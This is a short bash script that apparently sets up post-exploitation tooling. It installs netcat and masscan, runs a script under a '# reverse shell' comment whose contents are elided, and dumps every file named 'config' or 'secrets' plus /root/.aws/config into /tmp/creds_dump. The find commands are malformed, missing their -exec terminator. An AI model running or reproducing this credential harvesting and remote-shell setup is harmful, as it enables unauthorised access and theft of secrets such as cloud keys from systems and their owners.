#!/usr/bin/env bash
apt-get install -y netcat-traditional python3 python3-requests masscan libpcap-dev
# reverse shell
...
python3 run.py &
# extract credentials
find / -type f -iname 'config' -print -exec cat {} > /tmp/creds_dump
find / -type f -iname 'secrets' -print -exec cat {} >> /tmp/creds_dump
cat /root/.aws/config >> /tmp/creds_dump
